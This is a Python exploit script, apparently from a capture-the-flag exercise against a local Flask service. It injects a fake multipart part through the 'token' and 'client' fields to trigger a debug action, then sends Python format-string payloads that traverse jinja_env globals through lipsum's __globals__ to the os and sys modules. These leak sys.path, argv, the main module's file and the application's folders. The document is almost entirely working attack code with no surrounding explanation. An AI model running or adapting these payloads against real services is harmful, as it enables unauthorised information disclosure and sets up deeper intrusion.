import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 寻找包含文件路径/目录信息的属性

payloads = [
    # os.path 的一些常量
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.curdir}', 'curdir'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.pardir}', 'pardir'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.sep}', 'sep'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.altsep}', 'altsep'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.extsep}', 'extsep'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.pathsep}', 'pathsep'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.defpath}', 'defpath'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].path.devnull}', 'devnull'),
    
    # 系统信息
    ('{0.jinja_env.globals[lipsum].__globals__[os].uname_result}', 'uname_result'),
    
    # Flask 应用的路径
    ('{0.root_path}', 'root_path'),
    ('{0.instance_path}', 'instance_path'),
    ('{0.static_folder}', 'static_folder'),
    ('{0.template_folder}', 'template_folder'),
    
    # jinja_env 的配置
    ('{0.jinja_env.autoescape}', 'autoescape'),
    
    # 检查 sys 模块
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.prefix}', 'sys.prefix'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.exec_prefix}', 'sys.exec_prefix'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.base_prefix}', 'sys.base_prefix'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.path}', 'sys.path'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.argv}', 'sys.argv'),
    
    # 检查 __main__ 模块
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[__main__].__file__}', '__main__.__file__'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys.modules[__main__].__cached__}', '__main__.__cached__'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:1000] if len(result) > 1000 else result
        print(f"[{desc}]: {result}")
    except Exception as e:
        print(f"[{desc}]: Error - {e}")
